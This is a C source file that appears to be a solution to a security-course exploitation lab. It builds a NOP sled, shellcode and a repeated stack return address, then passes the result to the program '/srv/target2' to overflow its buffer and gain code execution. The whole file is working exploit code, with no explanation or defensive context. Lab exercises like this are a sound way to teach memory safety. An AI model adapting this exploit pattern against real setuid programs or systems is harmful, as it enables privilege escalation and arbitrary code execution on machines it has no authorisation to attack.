#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target2"

int main(void)
{
  char *args[4]; 
  char *env[1];

  char str[408];
  memset(str, 0, 408);

  for (int i = 0; i < 193; ++i)
  {
    strcat(str, "\x90");
  }
  strcat(str, shellcode);

  for (int i = 0; i < 38; i++)
  {
    strcat(str, "\xb4\xde\xff\xff");
  }
  
  args[0] = TARGET;
  args[1] = str; 

  args[2] = "65935";
  args[3] = NULL;
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


